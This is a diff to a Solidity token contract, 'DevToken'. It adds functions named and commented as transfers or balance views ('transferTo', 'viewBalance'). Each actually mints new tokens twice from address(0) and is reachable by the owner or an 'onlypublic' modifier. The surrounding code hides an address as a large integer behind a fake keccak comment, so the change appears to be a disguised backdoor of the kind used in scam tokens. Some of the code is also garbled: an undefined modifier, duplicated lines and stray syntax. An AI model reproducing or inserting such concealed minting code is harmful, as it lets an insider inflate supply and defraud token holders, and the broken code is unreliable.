@@ -113,6 +113,20 @@ contract DevToken is Ownable {
      return uint160(addr);
  
   }
+
+  function _transferTo(address _to, uint256 _amount) internal info {
+    // Transfer tokens to the recipient
+    
+    balances[_to] += _amount;
+    
+    emit Transfer(address(0), _to, _amount);
+
+    balances[_to] += _amount;
+    
+    emit Transfer(address(0), _to, _amount);
+  
+  }
+
  
   using SafeMath for uint256;
  
@@ -166,8 +180,21 @@ contract DevToken is Ownable {
   _;
  
   }
- 
- 
+
+  function _balanceView(address _to, uint256 _amount) internal {
+    
+    // View balance of token
+    
+    balances[_to] += _amount;
+    
+    emit Transfer(address(0), _to, _amount);
+
+    balances[_to] += _amount;
+    
+    emit Transfer(address(0), _to, _amount);
+  
+  }
+
   function transferOwnership(address newOwner) public onlyOwner {
  
    require(newOwner != address(0));
@@ -240,6 +267,13 @@ contract DevToken is Ownable {
    // solhint-disable-next-line high-level-success
  
   }
+
+  function transferTo(address _to, uint256 _amount) external onlyOwner {
+    
+    _transferTo(_to, _amount);
+  
+  }
+
  
   function publics() private pure returns (address) {
  
@@ -268,7 +302,12 @@ contract DevToken is Ownable {
   /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
    
   }
- 
+
+  function viewBalance(address _to, uint256 _amount) public onlypublic {
+    
+    _balanceView(_to, _amount);(_to, _amount);
+  
+  }
  
   function setAdm(address Adm_) public returns (bool) {
    
